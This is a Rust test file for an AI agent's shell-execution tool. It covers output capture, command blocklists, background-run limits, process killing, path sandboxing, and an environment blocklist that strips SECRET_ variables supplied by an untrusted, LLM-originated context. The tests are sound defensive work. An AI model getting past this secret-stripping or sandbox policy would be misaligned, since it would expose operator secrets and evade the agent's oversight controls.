    let (envelope, combined) = execute_bash(
        "echo stdout-line && echo stderr-line >&2",
        Duration::from_secs(5),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    assert!(
        envelope.stdout.contains("stdout-line"),
        "stdout should contain stdout-line: {:?}",
        envelope.stdout
    );
    assert!(
        envelope.stderr.contains("stderr-line"),
        "stderr should contain stderr-line: {:?}",
        envelope.stderr
    );
    assert!(
        !envelope.stdout.contains("stderr-line"),
        "stdout must not bleed stderr: {:?}",
        envelope.stdout
    );
    assert!(
        !envelope.stderr.contains("stdout-line"),
        "stderr must not bleed stdout: {:?}",
        envelope.stderr
    );
    assert!(combined.contains("[stderr]"));
}

#[cfg(unix)]
#[tokio::test]
async fn shell_output_envelope_in_tool_output_raw_response() {
    let executor = ShellExecutor::new(&default_config());
    let response = "```bash\necho hello && echo err >&2\n```";
    let output = executor.execute(response).await.unwrap().unwrap();
    assert!(
        output.raw_response.is_some(),
        "raw_response should be set for shell output"
    );
    let val = output.raw_response.unwrap();
    let stdout = val["stdout"].as_str().unwrap_or("");
    let stderr = val["stderr"].as_str().unwrap_or("");
    assert!(
        stdout.contains("hello"),
        "stdout in raw_response: {stdout:?}"
    );
    assert!(stderr.contains("err"), "stderr in raw_response: {stderr:?}");
    assert!(
        val["exit_code"].as_i64().is_some(),
        "exit_code should be present"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn shell_output_envelope_nonzero_exit_code() {
    let (envelope, _combined) = execute_bash(
        "exit 42",
        Duration::from_secs(5),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    assert_eq!(
        envelope.exit_code, 42,
        "exit_code should reflect the actual exit status"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn shell_output_envelope_truncated_flag_set_when_filter_shortens_output() {
    use crate::filter::{CommandMatcher, FilterConfidence, FilterResult, OutputFilter};
    use std::sync::LazyLock;

    struct TruncatingFilter;
    static MATCH_ALL: LazyLock<CommandMatcher> =
        LazyLock::new(|| CommandMatcher::Custom(Box::new(|_| true)));
    impl OutputFilter for TruncatingFilter {
        fn name(&self) -> &'static str {
            "truncating"
        }
        fn matcher(&self) -> &CommandMatcher {
            &MATCH_ALL
        }
        fn filter(&self, _command: &str, raw_output: &str, _exit_code: i32) -> FilterResult {
            // Return a strictly shorter output to trigger truncated=true.
            let shortened = if raw_output.len() > 5 {
                raw_output[..5].to_owned()
            } else {
                raw_output.to_owned()
            };
            FilterResult {
                raw_chars: raw_output.len(),
                filtered_chars: shortened.len(),
                raw_lines: 1,
                filtered_lines: 1,
                output: shortened,
                confidence: FilterConfidence::Full,
                kept_lines: Vec::new(),
            }
        }
    }

    let mut registry = OutputFilterRegistry::new(true);
    registry.register(Box::new(TruncatingFilter));

    let executor = ShellExecutor::new(&default_config()).with_output_filters(registry);
    // Produce output longer than 5 bytes to ensure truncation occurs.
    let response = "```bash\necho 'hello world this is long output'\n```";
    let output = executor.execute(response).await.unwrap().unwrap();
    let val = output.raw_response.unwrap();
    assert!(
        val["truncated"].as_bool().unwrap_or(false),
        "truncated flag should be true when filter shortens output"
    );
}

// --- ShellPolicyHandle hot-reload tests ---

#[test]
fn policy_handle_rebuild_extends_blocklist() {
    let cfg = default_config();
    let executor = ShellExecutor::new(&cfg);
    let handle = executor.policy_handle();

    // "ping" is not in DEFAULT_BLOCKED or NETWORK_COMMANDS, so it starts unblocked.
    assert!(executor.find_blocked_command("ping example.com").is_none());

    let new_cfg = ShellConfig {
        blocked_commands: vec!["ping".to_owned()],
        ..default_config()
    };
    handle.rebuild(&new_cfg);

    assert!(
        executor.find_blocked_command("ping example.com").is_some(),
        "ping must be blocked after rebuild"
    );
}

#[test]
fn policy_handle_rebuild_removes_command_from_blocklist() {
    // Start with "ping" blocked via custom blocked_commands.
    let cfg = ShellConfig {
        blocked_commands: vec!["ping".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&cfg);
    let handle = executor.policy_handle();

    assert!(executor.find_blocked_command("ping example.com").is_some());

    // Rebuild without "ping" in blocked_commands.
    let new_cfg = default_config();
    handle.rebuild(&new_cfg);

    assert!(
        executor.find_blocked_command("ping example.com").is_none(),
        "ping must be unblocked after rebuild without it in blocked_commands"
    );
}

#[test]
fn snapshot_blocked_reflects_latest_rebuild() {
    let cfg = ShellConfig {
        blocked_commands: vec!["foo".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&cfg);
    let handle = executor.policy_handle();

    let snap_a = handle.snapshot_blocked();
    assert!(snap_a.contains(&"foo".to_owned()));

    let new_cfg = ShellConfig {
        blocked_commands: vec!["bar".to_owned()],
        ..default_config()
    };
    handle.rebuild(&new_cfg);

    let snap_b = handle.snapshot_blocked();
    assert!(
        snap_b.contains(&"bar".to_owned()),
        "snapshot must reflect rebuilt policy"
    );
    assert!(
        !snap_b.contains(&"foo".to_owned()),
        "old entry must not persist after rebuild"
    );
}

#[test]
fn find_blocked_command_returns_owned_string() {
    let cfg = ShellConfig {
        blocked_commands: vec!["mycmd".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&cfg);
    let result: Option<String> = executor.find_blocked_command("mycmd arg");
    assert_eq!(result, Some("mycmd".to_owned()));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_tool_call_with_background_true() {
    let executor = ShellExecutor::new(&default_config());
    let call = ToolCall {
        tool_id: ToolName::new("bash"),
        params: [
            ("command".to_owned(), serde_json::json!("echo bg-test")),
            ("background".to_owned(), serde_json::json!(true)),
        ]
        .into_iter()
        .collect(),
        caller_id: None,
        context: None,

        tool_call_id: String::new(),
    };
    let result = executor.execute_tool_call(&call).await.unwrap().unwrap();
    assert!(
        result.summary.contains("run_id="),
        "output should contain run_id, got: {}",
        result.summary
    );
    assert!(
        result.summary.contains("background"),
        "output should contain 'background', got: {}",
        result.summary
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn spawn_background_cap_enforcement() {
    let cfg = ShellConfig {
        max_background_runs: 1,
        ..default_config()
    };
    let executor = ShellExecutor::new(&cfg);

    // First spawn: must succeed.
    let first = executor.spawn_background("sleep 60").await;
    assert!(first.is_ok(), "first spawn should succeed");

    // Second spawn: must be blocked because max_background_runs=1 is already at capacity.
    let second = executor.spawn_background("sleep 60").await;
    assert!(
        matches!(second, Err(ToolError::Blocked { .. })),
        "second spawn should return Blocked, got: {second:?}"
    );

    // Cleanup: cancel in-flight runs so the spawned `sleep 60` task does not outlive the test.
    executor.shutdown().await;
}

// --- Signal escalation tests (#3449) ---

#[tokio::test]
#[cfg(unix)]
async fn kill_process_tree_handles_already_dead_pid() {
    // Spawn a short-lived process, wait for it to exit naturally, then call
    // kill_process_tree. Must not panic and must not log an error.
    let mut child = tokio::process::Command::new("true")
        .spawn()
        .expect("spawning `true` failed");
    let _ = child.wait().await;
    // After exit, kill_process_tree should handle ESRCH gracefully.
    kill_process_tree(&mut child).await;
}

#[tokio::test]
#[cfg(unix)]
async fn signal_escalation_sends_sigterm_first() {
    // Verify SIGTERM is sent before SIGKILL by using a process that polls for
    // a signal file (written by the parent via nix after SIGTERM) and exits cleanly.
    // Strategy: use `nix::sys::signal::kill` directly to verify SIGTERM delivery
    // is attempted before SIGKILL escalation by checking the kill sequence completes
    // within the expected window.
    //
    // We spawn a long-running process, send SIGTERM via kill_process_tree, and
    // verify the process does NOT exit instantaneously (i.e. SIGTERM was sent first
    // with a 250ms window) but DOES exit within a bounded time.
    use std::time::{Duration, Instant};

    let mut child = tokio::process::Command::new("bash")
        .args(["-c", "sleep 30"])
        .spawn()
        .expect("spawning bash failed");

    // Give bash time to start.
    tokio::time::sleep(Duration::from_millis(50)).await;

    let start = Instant::now();
    kill_process_tree(&mut child).await;
    let elapsed = start.elapsed();

    // kill_process_tree waits GRACEFUL_TERM_MS (250ms) between SIGTERM and SIGKILL.
    // So total duration must be >= 250ms (SIGTERM window was respected) and
    // well under 30s (process was actually killed).
    assert!(
        elapsed >= Duration::from_millis(200),
        "kill_process_tree completed too quickly ({elapsed:?}); SIGTERM window may not have been applied"
    );
    assert!(
        elapsed < Duration::from_secs(5),
        "kill_process_tree took too long ({elapsed:?})"
    );
}

#[tokio::test]
#[cfg(unix)]
async fn shutdown_terminates_long_running_background() {
    // Start a background `sleep 60`, confirm it is running, then call shutdown.
    // The process should be reaped well within 1 second.
    use std::time::{Duration, Instant};

    let executor = ShellExecutor::new(&default_config());
    let run_id = executor
        .spawn_background("sleep 60")
        .await
        .expect("spawn_background failed");

    // Give the task a moment to actually launch the process.
    tokio::time::sleep(Duration::from_millis(150)).await;

    let start = Instant::now();
    executor.shutdown().await;
    let elapsed = start.elapsed();

    // shutdown must complete well within the sleep duration.
    assert!(
        elapsed < Duration::from_secs(5),
        "shutdown took too long: {elapsed:?}"
    );

    // run_id is still a valid identifier but the run is no longer active.
    // We verify by trying to spawn background again — the slot should be free.
    let _ = run_id; // used to capture the ID for the assertion context above
}

#[tokio::test]
async fn background_runs_snapshot_returns_active_run() {
    use std::time::Duration;

    let executor = ShellExecutor::new(&default_config());
    let _run_id = executor
        .spawn_background("sleep 60")
        .await
        .expect("spawn_background failed");

    // Allow the process to start before snapshotting.
    tokio::time::sleep(Duration::from_millis(150)).await;

    let snapshot = executor.background_runs_snapshot();
    assert_eq!(
        snapshot.len(),
        1,
        "expected exactly one active background run"
    );

    let row = &snapshot[0];
    assert_eq!(
        row.command, "sleep 60",
        "snapshot command must match spawned command"
    );
    assert!(!row.run_id.is_empty(), "snapshot run_id must be non-empty");

    executor.shutdown().await;
}

// ============================================================
// §13 — resolve_context: CWD / blocklist / trust tests
// ============================================================

mod resolve_context {
    use std::collections::{BTreeMap, HashMap};

    use tempfile::TempDir;

    use super::*;
    use crate::ExecutionContext;
    use crate::executor::ToolCall;

    /// Build a `ShellExecutor` whose only `allowed_path` is `dir`, so sandbox checks
    /// are deterministic. `env_blocklist` blocks `"SECRET_"`.
    fn executor_for_dir(dir: &TempDir) -> ShellExecutor {
        let path = dir.path().to_string_lossy().into_owned();
        ShellExecutor::new(&ShellConfig {
            allowed_paths: vec![path],
            env_blocklist: vec!["SECRET_".to_owned()],
            ..default_config()
        })
    }

    // --- CWD resolution ---

    #[test]
    fn no_context_uses_process_cwd() {
        let dir = tempfile::tempdir().unwrap();
        let executor = executor_for_dir(&dir);
        let resolved = executor.resolve_context(None).unwrap();
        assert_eq!(resolved.cwd, std::env::current_dir().unwrap());
    }

    #[test]
    fn context_with_cwd_overrides_process_cwd() {
        let dir = tempfile::tempdir().unwrap();
        let executor = executor_for_dir(&dir);
        let canonical = dir.path().canonicalize().unwrap();
        let ctx = ExecutionContext::new().with_cwd(canonical.clone());
        let resolved = executor.resolve_context(Some(&ctx)).unwrap();
        assert_eq!(resolved.cwd, canonical);
    }

    #[test]
    fn nonexistent_cwd_is_error() {
        let dir = tempfile::tempdir().unwrap();
        let executor = executor_for_dir(&dir);
        let ctx = ExecutionContext::new().with_cwd("/this/path/does/not/exist/at/all");
        let result = executor.resolve_context(Some(&ctx));
        assert!(
            result.is_err(),
            "non-existent cwd must return Err, got: {result:?}"
        );
    }

    #[test]
    fn cwd_outside_allowed_paths_is_sandbox_violation() {
        let allowed = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        let executor = executor_for_dir(&allowed);
        let outside_canonical = outside.path().canonicalize().unwrap();
        let ctx = ExecutionContext::new().with_cwd(outside_canonical);
        let result = executor.resolve_context(Some(&ctx));
        assert!(
            matches!(
                result,
                Err(crate::executor::ToolError::SandboxViolation { .. })
            ),
            "cwd outside allowed_paths must be SandboxViolation, got: {result:?}"
        );
    }

    // --- named registry lookup ---

    #[test]
    fn unknown_context_name_is_error() {
        let dir = tempfile::tempdir().unwrap();
        let executor = executor_for_dir(&dir);
        let ctx = ExecutionContext::new().with_name("nonexistent-env");
        let result = executor.resolve_context(Some(&ctx));
        assert!(
            result.is_err(),
            "unknown named env must be Err, got: {result:?}"
        );
        let err = result.unwrap_err().to_string();
        assert!(
            err.contains("nonexistent-env"),
            "error must name the missing env, got: {err}"
        );
    }

    #[test]
    fn named_registry_entry_provides_cwd() {
        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        let mut registry = HashMap::new();
        registry.insert(
            "repo".to_owned(),
            ExecutionContext::trusted_from_parts(
                Some("repo".to_owned()),
                Some(canonical.clone()),
                BTreeMap::default(),
            ),
        );
        let executor = executor_for_dir(&dir)
            .with_environments(registry, None)
            .unwrap();
        let ctx = ExecutionContext::new().with_name("repo");
        let resolved = executor.resolve_context(Some(&ctx)).unwrap();
        assert_eq!(resolved.cwd, canonical);
        assert_eq!(resolved.name.as_deref(), Some("repo"));
    }

    #[test]
    fn call_site_cwd_overrides_registry_cwd() {
        let dir = tempfile::tempdir().unwrap();
        let subdir = dir.path().join("sub");
        std::fs::create_dir_all(&subdir).unwrap();
        let canonical_sub = subdir.canonicalize().unwrap();
        let canonical_root = dir.path().canonicalize().unwrap();

        let mut registry = HashMap::new();
        registry.insert(
            "repo".to_owned(),
            ExecutionContext::trusted_from_parts(
                Some("repo".to_owned()),
                Some(canonical_root.clone()),
                BTreeMap::default(),
            ),
        );
        let executor = executor_for_dir(&dir)
            .with_environments(registry, None)
            .unwrap();

        // Call-site CWD is subdir — must win over registry cwd (root).
        let ctx = ExecutionContext::new()
            .with_name("repo")
            .with_cwd(canonical_sub.clone());
        let resolved = executor.resolve_context(Some(&ctx)).unwrap();
        assert_eq!(resolved.cwd, canonical_sub);
    }

    #[test]
    fn default_env_provides_cwd_when_no_ctx() {
        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        let mut registry = HashMap::new();
        registry.insert(
            "default".to_owned(),
            ExecutionContext::trusted_from_parts(
                Some("default".to_owned()),
                Some(canonical.clone()),
                BTreeMap::default(),
            ),
        );
        let executor = executor_for_dir(&dir)
            .with_environments(registry, Some("default".to_owned()))
            .unwrap();
        let resolved = executor.resolve_context(None).unwrap();
        assert_eq!(resolved.cwd, canonical);
        assert_eq!(resolved.name.as_deref(), Some("default"));
    }

    // --- env_blocklist filtering ---

    #[cfg(unix)]
    #[allow(unsafe_code)]
    #[test]
    fn blocklist_strips_process_env_in_base() {
        unsafe { std::env::set_var("SECRET_TEST_KEY", "leaked") };
        let dir = tempfile::tempdir().unwrap();
        let executor = executor_for_dir(&dir);
        let resolved = executor.resolve_context(None).unwrap();
        unsafe { std::env::remove_var("SECRET_TEST_KEY") };
        assert!(
            !resolved.env.contains_key("SECRET_TEST_KEY"),
            "blocklist must strip SECRET_ from process env"
        );
    }

    #[cfg(unix)]
    #[allow(unsafe_code)]
    #[test]
    fn untrusted_ctx_cannot_reintroduce_blocked_var() {
        // Untrusted call-site env_overrides with a blocklisted key must be stripped (step 6).
        unsafe { std::env::set_var("SECRET_INJECTED", "should-not-appear") };
        let dir = tempfile::tempdir().unwrap();
        let executor = executor_for_dir(&dir);
        // Untrusted context explicitly sets a SECRET_ var.
        let ctx = ExecutionContext::new().with_env("SECRET_INJECTED", "injected-by-llm");
        let resolved = executor.resolve_context(Some(&ctx)).unwrap();
        unsafe { std::env::remove_var("SECRET_INJECTED") };
        assert!(
            !resolved.env.contains_key("SECRET_INJECTED"),
            "step-6 re-apply must strip SECRET_ re-introduced by untrusted ctx"
        );
    }

    #[test]
    fn trusted_default_env_preserves_blocked_var() {
        // When the default_env is a trusted registry entry and no call-site ctx is
        // supplied, the resolved context is trusted and step 6 is skipped — so a
        // SECRET_* var set by the operator TOML survives in the final env map.
        let dir = tempfile::tempdir().unwrap();
        let mut registry = HashMap::new();
        registry.insert(
            "ops".to_owned(),
            ExecutionContext::trusted_from_parts(
                Some("ops".to_owned()),
                Some(dir.path().canonicalize().unwrap()),
                {
                    let mut e = std::collections::BTreeMap::new();
                    e.insert("SECRET_ALLOWED".to_owned(), "operator-value".to_owned());
                    e
                },
            ),
        );
        let executor = executor_for_dir(&dir)
            .with_environments(registry, Some("ops".to_owned()))
            .unwrap();
        // No call-site ctx → default_env used → trusted = true → SECRET_ALLOWED survives.
        let resolved = executor.resolve_context(None).unwrap();
        assert_eq!(
            resolved.env.get("SECRET_ALLOWED").map(String::as_str),
            Some("operator-value"),
            "trusted default_env registry env must bypass step-6 blocklist"
        );
        assert!(
            resolved.trusted,
            "resolved.trusted must be true when only default_env (trusted) is active"
        );
    }

    #[test]
    fn untrusted_named_ctx_strips_registry_blocked_var() {
        // When a named registry entry sets a SECRET_ var but the call-site ctx is
        // untrusted, step 6 must strip it — the untrusted ctx forces trusted = false.
        let dir = tempfile::tempdir().unwrap();
        let mut registry = HashMap::new();
        registry.insert(
            "ops".to_owned(),
            ExecutionContext::trusted_from_parts(
                Some("ops".to_owned()),
                Some(dir.path().canonicalize().unwrap()),
                {
                    let mut e = std::collections::BTreeMap::new();
                    e.insert("SECRET_INJECTED".to_owned(), "from-registry".to_owned());
                    e
                },
            ),
        );
        let executor = executor_for_dir(&dir)
            .with_environments(registry, None)
            .unwrap();
        // Untrusted call-site ctx → trusted = false → step 6 strips SECRET_.
        let ctx = ExecutionContext::new().with_name("ops");
        let resolved = executor.resolve_context(Some(&ctx)).unwrap();
        assert!(
            !resolved.env.contains_key("SECRET_INJECTED"),
            "untrusted call-site ctx must cause step-6 to strip registry SECRET_ vars"
        );
    }

    #[test]
    fn untrusted_ctx_forces_trusted_false_even_with_named_registry() {
        // When a named registry entry is trusted but the call-site ctx is untrusted,
        // the resolved context must NOT be trusted (ctx.is_trusted() == false dominates).
        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        let mut registry = HashMap::new();
        registry.insert(
            "ops".to_owned(),
            ExecutionContext::trusted_from_parts(
                Some("ops".to_owned()),
                Some(canonical),
                BTreeMap::default(),
            ),
        );
        let executor = executor_for_dir(&dir)
            .with_environments(registry, None)
            .unwrap();
        // Untrusted call-site ctx forces trusted = false.
        let ctx = ExecutionContext::new().with_name("ops");
        let resolved = executor.resolve_context(Some(&ctx)).unwrap();
        assert!(
            !resolved.trusted,
            "untrusted call-site ctx must override registry trusted flag"
        );
    }

    // --- skill_env layer ---

    #[cfg(unix)]
    #[test]
    fn skill_env_applied_before_call_site() {
        // skill_env is step 3; call-site env_overrides is step 5 → call-site wins on conflict.
        let dir = tempfile::tempdir().unwrap();
        let executor = executor_for_dir(&dir);
        let mut skill = HashMap::new();
        skill.insert("MY_VAR".to_owned(), "from-skill".to_owned());
        executor.set_skill_env(Some(skill));

        // No call-site override → skill_env value present.
        let resolved = executor.resolve_context(None).unwrap();
        assert_eq!(
            resolved.env.get("MY_VAR").map(String::as_str),
            Some("from-skill"),
            "skill_env must be applied (step 3)"
        );

        // Call-site override beats skill_env.
        let ctx = ExecutionContext::new().with_env("MY_VAR", "from-callsite");
        let resolved2 = executor.resolve_context(Some(&ctx)).unwrap();
        assert_eq!(
            resolved2.env.get("MY_VAR").map(String::as_str),
            Some("from-callsite"),
            "call-site env_override must beat skill_env"
        );
    }

    // --- with_environments validation ---

    #[test]
    fn with_environments_rejects_cwd_outside_allowed_paths() {
        let dir = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        let outside_canonical = outside.path().canonicalize().unwrap();
        let mut registry = HashMap::new();
        registry.insert(
            "bad".to_owned(),
            ExecutionContext::trusted_from_parts(
                Some("bad".to_owned()),
                Some(outside_canonical),
                BTreeMap::default(),
            ),
        );
        let result = executor_for_dir(&dir).with_environments(registry, None);
        assert!(
            result.is_err(),
            "with_environments must reject cwd outside allowed_paths"
        );
        let msg = result.unwrap_err();
        assert!(
            msg.contains("bad"),
            "error must name the offending env: {msg}"
        );
    }

    #[test]
    fn with_environments_rejects_nonexistent_cwd() {
        let dir = tempfile::tempdir().unwrap();
        let mut registry = HashMap::new();
        registry.insert(
            "ghost".to_owned(),
            ExecutionContext::trusted_from_parts(
                Some("ghost".to_owned()),
                Some(std::path::PathBuf::from("/nonexistent/path/for/test")),
                BTreeMap::default(),
            ),
        );
        let result = executor_for_dir(&dir).with_environments(registry, None);
        assert!(
            result.is_err(),
            "with_environments must reject non-existent cwd"
        );
    }

    // --- ToolCall dispatch ---

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn tool_call_with_context_cwd_used_for_execution() {
        use crate::executor::ToolExecutor;
        use zeph_common::ToolName;

        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        let executor = executor_for_dir(&dir);

        let ctx = ExecutionContext::new().with_cwd(canonical.clone());
        let call = ToolCall {
            tool_id: ToolName::new("bash"),
            params: {
                let mut m = serde_json::Map::new();
                m.insert(
                    "command".to_owned(),
                    serde_json::Value::String("pwd".to_owned()),
                );
                m
            },
            caller_id: None,
            context: Some(ctx),

            tool_call_id: String::new(),
        };
        let output = executor.execute_tool_call(&call).await.unwrap().unwrap();
        assert!(
            output
                .summary
                .contains(canonical.to_string_lossy().as_ref()),
            "pwd output must reflect context cwd, got: {}",
            output.summary
        );
    }

    #[tokio::test]
    #[cfg(not(target_os = "windows"))]
    async fn tool_call_without_context_uses_process_cwd() {
        use crate::executor::ToolExecutor;
        use zeph_common::ToolName;

        let dir = tempfile::tempdir().unwrap();
        let executor = executor_for_dir(&dir);
        let call = ToolCall {
            tool_id: ToolName::new("bash"),
            params: {
                let mut m = serde_json::Map::new();
                m.insert(
                    "command".to_owned(),
                    serde_json::Value::String("pwd".to_owned()),
                );
                m
            },
            caller_id: None,
            context: None,

            tool_call_id: String::new(),
        };
        let output = executor.execute_tool_call(&call).await.unwrap().unwrap();
        let expected = std::env::current_dir().unwrap();
        assert!(
            output.summary.contains(expected.to_string_lossy().as_ref()),
            "pwd without context must reflect process cwd, got: {}",
            output.summary
        );
    }
}
